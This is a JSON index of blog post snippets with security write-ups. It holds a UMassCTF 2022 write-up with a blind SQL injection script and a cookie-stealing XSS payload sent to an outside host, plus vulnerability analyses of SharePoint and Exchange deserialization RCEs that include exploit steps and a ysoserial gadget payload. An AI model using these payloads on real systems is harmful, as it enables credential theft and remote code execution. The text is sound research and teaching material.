[ { "title": "UMassCTF 2022", "url": "/posts/UMassCTF-2022/", "categories": "Writeups, UmassCTF 2022", "tags": "sqli, dom xss", "date": "2022-04-03 00:00:00 +0700", "snippet": "I haven’t released any CTF writeups for a long time. Today i done 2 web challenge in UmassCTF so i decided writing something.VentingAfter tried web features, the proxy history showed me 1 interest endpoint.Just change admin=True and we will get admin login page. Trying put ‘ in an textbox give me that this is sql injection challenge.I tried dumped admin’s password by the following script and get the flag.import requestspasswd = &#39;&#39; for i in range(36): for x in range(127, 31, -1): c = chr(x) basepl = { &quot;user&quot;: &quot;admin&quot;, &quot;pass&quot;: &quot;1&#39; or (SELECT hex(substr(password,{},1)) FROM users WHERE+username=&#39;admin&#39;) &amp;gt; hex(&#39;{}&#39;) and &#39;a&#39;=&#39;a&quot;.format(i+1, c) } res = requests.post( &#39;http://34.148.103.218:4446/fff5bf676ba8796f0c51033403b35311/login&#39;, data=basepl, verify=False) # print(c+&#39; : &#39;+str(len(res.text))) if len(res.text) == 113: passwd += chr(x+1) break print(passwd)UmassdiningThe source code is given in the challenge’s description but I checked web features first. The web navigation shows us 3 options: Home, Register, Join. Register is basically for registration, after fill the form we got the message ‘We got your request and will read it shortly!’. Join navigation is maybe administrator feature because the message ‘You’re not allowed here!’ appeared. Next we audit the source code. This web has the following 3 main endpoint@app.route(&quot;/register&quot;,methods = [&#39;GET&#39;,&#39;POST&#39;])def get_register(): if(request.method==&#39;GET&#39;): response = make_response(render_template(&#39;register.html&#39;)) add_resp_headers(response); if(check_for_cookie()==False): response.set_cookie(&quot;auth&quot;,&quot;-1&quot;,secure=True,samesite=None) return response elif(request.method==&#39;POST&#39;): if(active_count()&amp;lt;10): data = request.form.to_dict() thread = Thread(target=bot.checkEssay,kwargs={&#39;data&#39;:data}) thread.start() return &quot;We got your request and will read it shortly!&quot;,200 else: return &quot;We are busy right now, try again in a second&quot;,200@app.route(&quot;/review/essay&quot;,methods = [&#39;GET&#39;,&#39;POST&#39;])def reviewEssay(): essay = {&quot;email&quot;:request.args.get(&quot;name&quot;),&quot;essay&quot;:request.args.get(&quot;essay&quot;)} response = make_response(render_template(&#39;essay_checker.html&#39;,essay=essay)) add_resp_headers(response) if(request.remote_addr != &#39;127.0.0.1&#39;): return &quot;Sorry pal you\\&#39;re not admin&quot; try: return response except: return &#39;no essays to read&#39;,200@app.route(&quot;/join&quot;,methods = [&#39;GET&#39;])def get_play(): if(request.cookies.get(&quot;auth&quot;)==admin_cookie): return &quot;TEST{not_the_real_flag}&quot;,200 return &quot;You&#39;re not allowed here!&quot;,403Endpoint /join checks auth cookie and only returns flag if it is admin cookie. I need to get the admin token by somehow. /register forwards request data to bot.checkEssaydef checkEssay(data): opts = Options() opts.add_argument(&quot;--headless&quot;) driver = Firefox(executable_path=&#39;/usr/bin/geckodriver&#39;,options=opts) driver.set_window_size(320, 240) driver.set_page_load_timeout(5) driver.get(&#39;http://127.0.0.1:8000/&#39;) driver.add_cookie({&quot;name&quot;:&quot;auth&quot;,&quot;value&quot;:admin_cookie}) driver.get(&#39;http://127.0.0.1:8000/review/essay?email={a}&amp;amp;essay={b}&#39;.format(a=data[&#39;email&#39;],b=data[&#39;essay&#39;])) time.sleep(3) driver.quit()The above section takes data from register endpoint, add admin’s cookie to cookie and make request to the last of 3 endpoints - /review/essay, maybe i could leak the cookie from this. Look /review/essay handlerdef reviewEssay(): essay = {&quot;email&quot;:request.args.get(&quot;name&quot;),&quot;essay&quot;:request.args.get(&quot;essay&quot;)} response = make_response(render_template(&#39;essay_checker.html&#39;,essay=essay)) add_resp_headers(response) if(request.remote_addr != &#39;127.0.0.1&#39;): return &quot;Sorry pal you\\&#39;re not admin&quot; try: return response except: return &#39;no essays to read&#39;,200Check the essay_checker template returned by the above handler&amp;lt;!DOCTYPE html&amp;gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Admin Essay Review&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt; &amp;lt;h1&amp;gt; Essay Review Panel &amp;lt;/h1&amp;gt;&amp;lt;br&amp;gt; &amp;lt;div&amp;gt; &amp;lt;main&amp;gt; Essay&amp;lt;br&amp;gt; &amp;lt;br&amp;gt; Author&amp;lt;br&amp;gt; &amp;lt;br&amp;gt; &amp;lt;/main&amp;gt; &amp;lt;/div&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;The jinja2’s safe filter is used in essay property of essay object. The safe filter basically disables html-escape in the expression passed through it while rendering html page. It’s maybe vulnerable to XSS exploit and i can make outbound request to get admin’s cookie. I tried some basic payload but it didn’t work, my outbound server didn’t get any requests. The reason is the followingdef add_resp_headers(response): response.headers[&#39;Content-Security-Policy&#39;]= &quot;default-src &#39;self&#39;;script-src &#39;self&#39; &#39;unsafe-eval&#39;&quot;The above section adds CSP header to response that restrict browser can only load resource from the current origin. It literally means all directly payloads from our essay param won’t work. For more information about CSP, you can read here. I checked static folder and expected there was any usefull javascript file in it. And i saw things.jsvar iloveumass = document.getElementById(&quot;debug&quot;).getAttribute(&quot;data-iloveumass&quot;);function say_something(words){ setTimeout(`console.log(&#39;${words}&#39;)`,500)}document.addEventListener(&quot;DOMContentLoaded&quot;, function() { say_something(iloveumass)});This script gets the html element with id ‘debug’, takes ‘data-iloveumass’ attribute from it and passes it to vulnerable setTimeout function call. We can manipulate this file to bypass CSP protection. Final payload is the following&amp;lt;script id=&#39;debug&#39; src=&quot;/static/js/thing.js&quot; data-iloveumass=&quot;aaa&#39;);eval(document.location=&#39;http://hoangnd.free.beeceptor.com?cookie=&#39;%2bdocument.cookie);console.log(&#39;aaa&quot;&amp;gt;&amp;lt;/script&amp;gt;Put it in essay in register form, and an request will be made to your server.Add admin’s cookie to /join endpoint and get flag." }, { "title": "CVE-2022-22005 Microsoft Sharepoint RCE", "url": "/posts/cve-2022-22005-microsoft-sharepoint-RCE/", "categories": "One-day analysis", "tags": "cve-2022-22005, microsoft sharepoint", "date": "2022-03-07 10:00:00 +0700", "snippet": "Vulnerability Analysis CVE-2022-22005Microsoft SharepointSharePoint is a platform for sharing and managing content, knowledge, and apps to support teamwork, quickly finding information, and collaborating seamlessly across the organization. More than 200,000 organizations and 190 million people use SharePoint for intranets, team sites, and content management. The number above is enough to see that this is always a big target for security researchers looking for vulnerabilities.With SharePoint, users can create an intranet (or intranet system) that works like any other website. In addition to a large site for the organization, sharepoint can divide small sub-sites for each group and internal department. Besides, this is a great content sharing management platform with customizable lists. Some types of list are built-in on Sharepoint such as list of images, documents, forms… In addition to the built-in lists, users can install a new list and customize the properties of that list as they want. The powerful toolsets for customizing on Sharepoint are Sharepoint Designer and InfoPath Designer.CVE-2022-22005Microsoft’s February - 2022 patch fixes a vulnerability with code CVE-2022-22005. This vulnerability allows an attacker to execute code remotely and is scored 8.8 on the CVSSv3 calculator. Affected versions are listed below Microsoft SharePoint Server Subscription Edition Microsoft SharePoint Server 2019 Microsoft SharePoint Enterprise Server 2013 Service Pack 1 Microsoft SharePoint Enterprise Server 2016The analysis below was performed on Microsoft SharePoint Enterprise Server 2016.Patch analysisInstall patch January and February 2022 of Sharepoint 2016, gather Sharepoint dll files and decompile into source. Then add a few post-filter steps to remove unnecessary elements (comments, …). Finally compare the two patches to find where the code is used by developers to patch. A deserialization patch location is found at Microsoft.Office.Server.Internal.Charting.UI.WebControls.ChartPreviewImage.loadChartImage()The patch uses a binder that limits what types are allowed to deserialize, which is what Microsoft used to do for bugs like this in the past. About the deserialize vulnerability you can learn more at here.Trace codeLearn a little bit about chart, this is a webpartpage - component of a page on Sharepoint. So it can be understood that in order for the data to go to the deserialize location, there must be a user account with permission to create page. Combining debugging and creating a page that uses the chart, the code is hit when the chart is loading data. Observe the function that causes the vulnerability, the deserialize data located in the buffer variable is set via the FetchBinaryData(sessionKey) function.// Microsoft.Office.Server.Internal.Charting.UI.WebControls.ChartPreviewImage.loadChartImage()private ChartImageSessionBlock loadChartImage(){ byte[] buffer = CustomSessionState.FetchBinaryData(this.sessionKey); ChartImageSessionBlock result = null; using ( MemoryStream memoryStream = new MemoryStream(buffer) ) { IFormatter formatter = new BinaryFormatter(); result = (ChartImageSessionBlock)formatter.Deserialize(memoryStream); } return result;}The code relates to session state in Sharepoint. This is a mechanism to store the state of an object in the sharepoint, that state can be a file, an image, … or specifically in this case a serialized ChartImageSessionBlock object. These states will be stored in the database as binary data and mapped to a session key. So to exploit this vulnerability we need to control the binary data in the database, then through the loadChartImage function to deserialize an arbitrary object. By using the Burp Suite tool during debugging we can get a request to trigger vulnerability.GET /_layouts/15/Chart/WebUI/Controls/ChartPreviewImage.aspx?sk=5264ebfb259840faa703bdbc976e069b_74929f85360d499d9f1d4f337bf49300&amp;amp;hash=2551012 HTTP/1.1Host: sharepoint2016:33257User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36Referer: http://sharepoint2016:33257/SitePages/testpage.aspxCookie: stsSyncAppName=Client; stsSyncIconPath=; WSS_FullScreenMode=falseConnection: Keep-AliveThe variable sk here is the sessionKey passed into the FetchBinaryData function, it has the form guid1_guid2 where guid1 is the id of the database and guid2 is the id of the ChartImageSessionBlock. To exploit the vulnerability, we will force guid2 to the id of another session state that contains the arbitrary binarydata. The next thing to do is figure out how to put arbitrary binary data into the session state table in the database.An article is published on the ZDI site about A previous vulnerability with code CVE-2021-27076 related to session state, using attachment mechanism on infopath form. When starting to create a new item in an infopath list, the item will be registered with a session key of itemId. Next, when attaching a file to this new item, that file will be saved as a binary data in the database with the key attachmentId.Arbitrary binary data is in the attachment file, and attachmentId is what we need to get to trigger the vulnerability. The problem is that when creating a new item in the infolist, only itemId will be returned in response. Through building the lab, found that the value of attachmentId is in the binarydata of the item, so we need to find a way to get attachmentId through itemId. The ZDI article also showed how to solve this problem, which is to replay itemId to FormServerAttachments.aspx, which will take the item’s binarydata and return it as a file.Here there are two directions to find the right request to FormServerAttachments.aspx, one is to try the functions, the other is to read the code and craft the request yourself. The first option will be better because it will save time and we will also get a right-format request. In case the function cannot be determined, it is mandatory to follow option 2 to read the code. Because the binary is returned as a file, the FileDownload function caught my eye.// Microsoft.Office.InfoPath.Server.Controls.FormServerAttachments.FileDownload(HttpContext) private static bool FileDownload(HttpContext context){ string text = context.Request.QueryString[&quot;fid&quot;]; string text2 = context.Request.QueryString[&quot;sid&quot;]; string value = context.Request.QueryString[&quot;key&quot;]; string strA = context.Request.QueryString[&quot;dl&quot;]; int num = 0; string empty = string.Empty; if (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(value) || (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0 &amp;amp;&amp;amp; string.Compare(strA, &quot;ip&quot;, StringComparison.OrdinalIgnoreCase) != 0)) { ULS.SendTraceTag(1831874679U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Medium, &quot;Invalid request incorrect or missing query strings: {0}&quot;, new object[] { context.Request.Url.ToString() }); return false; } using (new GlobalStorageContext(text)) { try { SPSite spsite = SiteAndWebCache.Fetch().EnsureRequestSite(); Solution solutionById = SolutionCache.GetSolutionById(spsite, new SolutionIdentity(text2)); if (Canary.VerifyCanaryFromCookie(context, spsite, solutionById)) { context.Response.Clear(); context.Response.Cache.SetExpires(DateTime.Now.AddDays(2.0)); using (BinaryWriter binaryWriter = new BinaryWriter(context.Response.OutputStream)) { Base64DataStorage.Base64DataItem item = null; StreamUtils.DeserializeObjectsFromString(value, delegate (EnhancedBinaryReader binaryReader) { item = new Base64DataStorage.Base64DataItem(binaryReader); DocumentChildState.StateInfo stateInfo = new DocumentChildState.StateInfo(); ((IBinaryDeserializable)stateInfo).Deserialize(binaryReader); StateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey); item.EnsureData(stateKey); }); byte[] dataAsBytes = item.GetDataAsBytes(); using (Stream stream = new MemoryStream(dataAsBytes, false)) { if (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0) { context.Response.AppendHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\\&quot;image\\&quot;&quot;); context.Response.AppendHeader(&quot;X-Download-Options&quot;, &quot;noopen&quot;); context.Response.ContentType = ImageUtils.GetContentType(dataAsBytes); return InlinePicture.ReadInfoFromStream(binaryWriter, stream); } context.Response.ContentType = &quot;application/octet-stream&quot;; if (FileAttachment.ReadInfoFromStream(binaryWriter, out num, out empty, stream)) { FilePathUtils.AddFileDownloadHttpHeader(context, empty); return true; } return false; } } } ULS.SendTraceTag(1831874680U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Verbose, &quot;Can&#39;t verify canary from cookie for FileDownload&quot;); return false; } catch (InfoPathException) { ULS.SendTraceTag(1831874681U, ULSCat.msoulscat_formservices_runtime, ULSTraceLevel.Medium, &quot;InfoPathException occurred downloading fileattachment or inline picture&quot;); } } return false;}Luckily the variables required for request are pretty obvious - fid, sid, key, dl. Let’s dive a little deeper into the components, the following code is the error return condition// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strAif (string.IsNullOrEmpty(text) || string.IsNullOrEmpty(text2) || string.IsNullOrEmpty(value) || (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0 &amp;amp;&amp;amp; string.Compare(strA, &quot;ip&quot;, StringComparison.OrdinalIgnoreCase) != 0))So the required params must be non-empty, where dl must be either the string ‘fa’ or ‘ip’.// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strASPSite spsite = SiteAndWebCache.Fetch().EnsureRequestSite();Solution solutionById = SolutionCache.GetSolutionById(spsite, new SolutionIdentity(text2));if (Canary.VerifyCanaryFromCookie(context, spsite, solutionById)){ ...}This code gets the solutionId from sid and authenticate it with the infopath canary inside the cookie, for example a cookie like this:_InfoPath_CanaryValueAGQX2G3RUCCXQRUNZHR3UB7IIEMSOL2MNFZXI4ZPORSXG5C7NFXGM327NRUXG5BPJF2GK3JPORSW24DMMF2GKLTYONXCWMKZLBZTE4TDI5WXC4ZSIIZGIUTINE4EI6DBGFWVKNKDLFZGSTJYLFNHE33VMJ5EGSLEOM=KBxeU4WXMZ3Yg8v0ZPZfAWcpoiLL/R3sfejthMFTfL1x9GqMoiIOMSS9XrT0gguJmdn0Yj2qw0gqlDJXT7X49A==|637806206864107501This cookie has a key in the format ‘_InfoPath_CanaryValue’+ suffix. The suffix is sid to look for. Next is the code that gets the binary data from the session key.// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strABase64DataStorage.Base64DataItem item = null;StreamUtils.DeserializeObjectsFromString(value, delegate (EnhancedBinaryReader binaryReader){ item = new Base64DataStorage.Base64DataItem(binaryReader); DocumentChildState.StateInfo stateInfo = new DocumentChildState.StateInfo(); ((IBinaryDeserializable)stateInfo).Deserialize(binaryReader); StateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey); item.EnsureData(stateKey);});byte[] dataAsBytes = item.GetDataAsBytes();The session state key will be retrieved from the key variable, let’s see the details of the DeserializeObjectsFromString function// fid -&amp;gt; text, sid -&amp;gt; text2, key -&amp;gt; value, dl -&amp;gt; strAinternal static void DeserializeObjectsFromString(string value, Action&amp;lt;EnhancedBinaryReader&amp;gt; readerMethod){ using (Base64Stream base64Stream = new Base64Stream(value)) { using (EnhancedBinaryReader enhancedBinaryReader = new EnhancedBinaryReader(base64Stream)) { readerMethod(enhancedBinaryReader); } }}So key needs to be in base64 format, see Base64DataStorage.Base64DataItem(binaryReader) function.// Microsoft.Office.InfoPath.Server.SolutionLifetime.Base64DataStorage.Base64DataItem.Base64DataItem(EnhancedBinaryReader)internal Base64DataItem(EnhancedBinaryReader reader){ this._state = (Base64ItemState)reader.ReadCompressedInt(); this._sessionDataType = (Base64DataStorage.Base64DataItem.DataTypeInSessionState)reader.ReadCompressedInt(); this._itemId = new Base64SerializationId(reader);}So the first 3 positions in the key’s structure will be base64ItemState (int) dataTypeInSessionState (int) base64SerializationId (guid string)let’s see the function DocumentChildState.StateInfo.Deserialize(binaryReader)// DocumentChildState.StateInfo.Deserialize(binaryReader)void IBinaryDeserializable.Deserialize(EnhancedBinaryReader reader){ this._serializedKey = reader.ReadString(); this._size = reader.ReadCompressedInt(); this._version = reader.ReadCompressedInt();}so the next 3 positions in the key’s structure will be serializedKey (string) size (int) version (int)Next let’s consider which components will require correct value. The part to get the session state key is as followsStateKey stateKey = StateKey.ParseKey(stateInfo.SerializedKey);item.EnsureData(stateKey);So the serializedKey has the form guid1_guid2, where guid1 is the database id and guid2 is the itemId we put in, next see the item.EnsureData(stateKey) function// Microsoft.Office.InfoPath.Server.SolutionLifetime.Base64DataStorage.Base64DataItem.EnsureData(StateKey)internal void EnsureData(StateKey stateKey){ if (this.State == Base64ItemState.DelayLoad) { byte[] sessionData = StateManager.GetManager(HttpContext.Current).PeekState(stateKey); // get binary data from stateKey this.SetSessionData(sessionData); return; } if (this.State == Base64ItemState.Removed) { throw new InfoPathLocalizedException(InfoPathResourceManager.Ids.ServerGenericError, new string[0]); }}The first condition must be met to get binarydata from the database, so base64ItemState must have the value of enum Base64ItemState.DelayLoad, see inside Base64ItemStateinternal enum Base64ItemState{ NoChange, Updated, Removed, New, DelayLoad // 4}From there base64ItemState has to be 4. Next look at the enum values of dataTypeInSessionStateprivate enum DataTypeInSessionState{ Unknown, Utf8String, ByteArray // 2}The data we need is stored in the session state table as binary data, so the value of dataTypeInSessionState has to be 2. In summary, key has the following structure.After getting the binarydata, here is the code returns it as a fileusing (Stream stream = new MemoryStream(dataAsBytes, false)){ if (string.Compare(strA, &quot;fa&quot;, StringComparison.OrdinalIgnoreCase) != 0) { context.Response.AppendHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\\&quot;image\\&quot;&quot;); context.Response.AppendHeader(&quot;X-Download-Options&quot;, &quot;noopen&quot;); context.Response.ContentType = ImageUtils.GetContentType(dataAsBytes); return InlinePicture.ReadInfoFromStream(binaryWriter, stream); } context.Response.ContentType = &quot;application/octet-stream&quot;; if (FileAttachment.ReadInfoFromStream(binaryWriter, out num, out empty, stream)) { FilePathUtils.AddFileDownloadHttpHeader(context, empty); return true; } return false;}so dl must have the value ‘ip’. The variables sent to FormServerAttachments.aspx have the following formExploit stepsAfter detailed analysis, the exploit steps are summarized as follows: Create an infopath list on the site. Open the form to create a new item on the list, save the itemId from the response. Attachment file contains the payload on that item, but don’t press save so that the session state can be kept in the database. Put the itemId information obtained from step 2 into the request sent to FormServerAttachments.aspx, save the attachmentId information from the response. Include attachmentId in the request to trigger deserialize in ChartPreviewImage.PermissionBy default, a normal account has permission to create sub-sites and that account will have full permissions on the new site. Therefore, we only need an account with default permissions to exploit the vulnerability.Proof of Concepthttps://youtu.be/1Ckjh-uuNu4REFERENCEShttps://www.zerodayinitiative.com/blog/2021/3/17/cve-2021-27076-a-replay-style-deserialization-attack-against-sharepoint" }, { "title": "CVE-2021-42321 Microsoft Exchange RCE", "url": "/posts/CVE-2021-42321-Microsoft-Exchange-RCE/", "categories": "One-day analysis", "tags": "cve-2021-42321, microsoft exchange", "date": "2021-11-20 15:00:00 +0700", "snippet": "Ở bản vá tháng 11 của Exchange, một lỗ hổng có mã CVE-2021-42321 được Microsoft tức tốc cảnh báo người dùng phải nhanh chóng cập nhật bản vá để tránh bị khai thác. Bài PoC chi tiết về quá trình diff code và phân tích đã có Blog của NCSC, ở đây mình chỉ nêu thêm một số lưu ý và bước cuối trong quá trình exploit.Exchange Web Service (EWS)Ngoài hai endpoint chính là /ecp và /owa để quản lý cấu hình và hộp thư, Exchange còn có /ews cho webservice.EWS cung cấp cho người dùng khả năng giao tiếp với máy chủ Exchange thông qua các SOAP request, đồng nghĩa với việc request và response được biểu diễn dưới dạng XML. Template XML được định nghĩa từ các file schema và wsdl trên virtual directory của máy chủ Exchange. Các tệp này có thể truy cập bằng browser qua các Url dưới đây. http://[yourclientaccessserver].com/ews/services.wsdl — The location of the WSDL file. http://[yourclientaccessserver].com/ews/messages.xsd — The location of the messages schema. http://[yourclientaccessserver].com/ews/types.xsd — The location of the types schema.Endpoint để giao tiếp với máy chủ Exchange mặc định là /EWS/Exchange.asmx tuy nhiên trên môi trường product nên sử dụng Autodiscover để xác định url của ews chính xác.User configurationNhư ở bài blog của NCSC, hàm gây ra lỗi là hàm TryDeserialize của lớp Microsoft.Exchange.Data.ApplicationLogic.Extension.OrgExtensionSerializerĐặt debug ở hàm gây lỗi, sử dụng chức năng trên trang add-ins ở /ecp để quan sát biến userConfigurationQuan sát thấy userConfiguration có thuộc tính ConfigurationName là ExtensionMasterTable và có dạng dictionary chứa 3 thuộc tính OrgDO, OrgExtV, OrgChkTm. Để hàm nhảy vào được đoạn deserialize thì tham số OrgDO của biến userConfiguration phải có giá trị là false, mặc định giá trị hiện tại đang là true.Sau đấy cần tiếp tục tìm kiếm cách update user configuration, đoạn này ở trang doc của Microsoft đã mô tả cực kỳ chi tiết. Ở tài liệu nhắc đến ở trên họ cũng đã cho mình một ví dụ hoàn chỉnh về SOAP request, cùng ngó qua một chút&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:m=&quot;https://schemas.microsoft.com/exchange/services/2006/messages&quot; xmlns:t=&quot;https://schemas.microsoft.com/exchange/services/2006/types&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&amp;gt; &amp;lt;soap:Header&amp;gt; &amp;lt;t:RequestServerVersion Version=&quot;Exchange2010&quot; /&amp;gt; &amp;lt;/soap:Header&amp;gt; &amp;lt;soap:Body&amp;gt; &amp;lt;m:UpdateUserConfiguration&amp;gt; &amp;lt;m:UserConfiguration&amp;gt; &amp;lt;t:UserConfigurationName Name=&quot;TestConfig&quot;&amp;gt; &amp;lt;t:DistinguishedFolderId Id=&quot;drafts&quot;/&amp;gt; &amp;lt;/t:UserConfigurationName&amp;gt; &amp;lt;t:Dictionary&amp;gt; &amp;lt;t:DictionaryEntry&amp;gt; &amp;lt;t:DictionaryKey&amp;gt; &amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt; &amp;lt;t:Value&amp;gt;PhoneNumber&amp;lt;/t:Value&amp;gt; &amp;lt;/t:DictionaryKey&amp;gt; &amp;lt;t:DictionaryValue&amp;gt; &amp;lt;t:Type&amp;gt;String&amp;lt;/t:Type&amp;gt; &amp;lt;t:Value&amp;gt;111-111-5555&amp;lt;/t:Value&amp;gt; &amp;lt;/t:DictionaryValue&amp;gt; &amp;lt;/t:DictionaryEntry&amp;gt; &amp;lt;/t:Dictionary&amp;gt; &amp;lt;/m:UserConfiguration&amp;gt; &amp;lt;/m:UpdateUserConfiguration&amp;gt; &amp;lt;/soap:Body&amp;gt;&amp;lt;/soap:Envelope&amp;gt;Từ ví dụ này có thể thấy một user configuration sẽ có các thành phần bắt buộc là Name cùng FolderId, bên dưới là các DictionaryEntry, cấu trúc này khớp với biến userConfiguration mình đã quan sát ở trên. Như vậy mình đã biết các thành phần là Name và DictionaryEntry, phải có thêm FolderId mới có thể update được config ExtensionMasterTable. ExtensionMasterTable là một config có sẵn trên Exchange, vậy khả năng folder của nó cũng đâu đó trong số những thằng có sẵn. Mình thử gửi bừa một get request để lấy thông tin của ExtensionMasterTableError 500 🙄🙄🙄🙄🙄🙄. Đến đây thì mình đã thử 7 7 49 chiêu nhưng response vẫn luôn là 500, k hiểu kiểu gì khi request được lấy từ chính doc. May mắn có người anh từng pwn2own Exchange vẫn còn giữ lại 1 request hồi đấy và gửi cho mình test thử. It worked! but why? Sau khi hết soi nổi bằng mắt thường thì mình quyết định dùng Winmerge để so sánh hai thằng với nhau, đúng ra nên dùng sớm hơn 😃.Sửng sốt không hề nhẹ khi nhận ra khác biệt gây ra lỗi 500 là chỗ khai báo namespace, trang doc lại sử dụng https thay vì http. 🤐 Cạn lời …Trở lại với vấn đề xác định FolderId, sau khi đã giải quyết lỗi 500, test thử một số folder có sẵn, ngay thằng đầu tiên đã dínhNgoài việc xác định được FolderId của ExtensionMasterTable là inbox, mình còn có được cấu trúc của nó để đưa vào request update (để đảm bảo không có vấn đề gì mình thường get trước sau đó sửa thông tin để đưa vào update). Update thử ExtensionMasterTable và kiểm tra lại bằng get requestỔn rồi, debug lại thử thôi. Sửng sốt again khi vẫn không thể nhảy vào đoạn code deserialize. Sau đó mình phát hiện ra việc sử dụng chức năng trên trang add-ins sẽ đưa ExtensionMasterTable sẽ bị đưa trở lại về giá trị mặc định (OrgDO=true) khiến việc update config của mình đến đây trở nên vô nghĩa. Nghĩ đến chuyện phải trace code vào sâu hơn để xác định chỗ đưa config trở về mặc định là trầm cảm, thôi thì mình thử fuzz chức năng trước, có thể chức năng nào đấy sẽ không reset config, ai biết được 🤷. Cuối cùng mình phát hiện ra load lại trang add-ins sẽ không reset config. Nice.ExploitSau khi đã đạt được mục đích là vào được đến chỗ deserialize, cần tìm cách ráp một entry với type base64 vào ExtensionMasterTable + ysoserial để exploit. Trở lại với 3 file schema mô tả cấu trúc xml ở phần đầu mình có nhắc đến, type.xsd biểu diễn các type bên trong các request soap. Mình đang cần check type của UserConfiguration, search luôn bằng browserBên trong các node mẹ sẽ có thông tin các node con có thể có cùng cấp, quan sát thấy rằng cùng cấp với UserConfigurationName có hai node có type base64 là XmlData và BinaryData. Sử dụng một trong hai để đưa payload ysoserial vào bên trong. Câu lệnh tạo payload.\\ysoserial.exe -c &quot;calc&quot; -g TypeConfuseDelegate -f BinaryFormatter -o base64Cấu trúc cuối cùng của soap request update ExtensionMasterTable&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:m=&quot;http://schemas.microsoft.com/exchange/services/2006/messages&quot; xmlns:t=&quot;http://schemas.microsoft.com/exchange/services/2006/types&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot;&amp;gt; &amp;lt;soap:Header&amp;gt; &amp;lt;t:RequestServerVersion Version=&quot;Exchange2010&quot; /&amp;gt; &amp;lt;/soap:Header&amp;gt; &amp;lt;soap:Body&amp;gt; &amp;lt;m:UpdateUserConfiguration&amp;gt; &amp;lt;m:UserConfiguration&amp;gt; &amp;lt;t:UserConfigurationName Name=&quot;ExtensionMasterTable&quot;&amp;gt; &amp;lt;t:DistinguishedFolderId Id=&quot;inbox&quot;/&amp;gt; &amp;lt;/t:UserConfigurationName&amp;gt;&amp;lt;t:BinaryData&amp;gt;AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BQEAAACEAVN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLlNvcnRlZFNldGAxW1tTeXN0ZW0uU3RyaW5nLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldXQQAAAAFQ291bnQIQ29tcGFyZXIHVmVyc2lvbgVJdGVtcwADAAYIjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0IAgAAAAIAAAAJAwAAAAIAAAAJBAAAAAQDAAAAjQFTeXN0ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYy5Db21wYXJpc29uQ29tcGFyZXJgMVtbU3lzdGVtLlN0cmluZywgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0BAAAAC19jb21wYXJpc29uAyJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyCQUAAAARBAAAAAIAAAAGBgAAAAcvYyBjYWxjBgcAAAADY21kBAUAAAAiU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcgMAAAAIRGVsZWdhdGUHbWV0aG9kMAdtZXRob2QxAwMDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeS9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkIAAAACQkAAAAJCgAAAAQIAAAAMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQcAAAAEdHlwZQhhc3NlbWJseQZ0YXJnZXQSdGFyZ2V0VHlwZUFzc2VtYmx5DnRhcmdldFR5cGVOYW1lCm1ldGhvZE5hbWUNZGVsZWdhdGVFbnRyeQEBAgEBAQMwU3lzdGVtLkRlb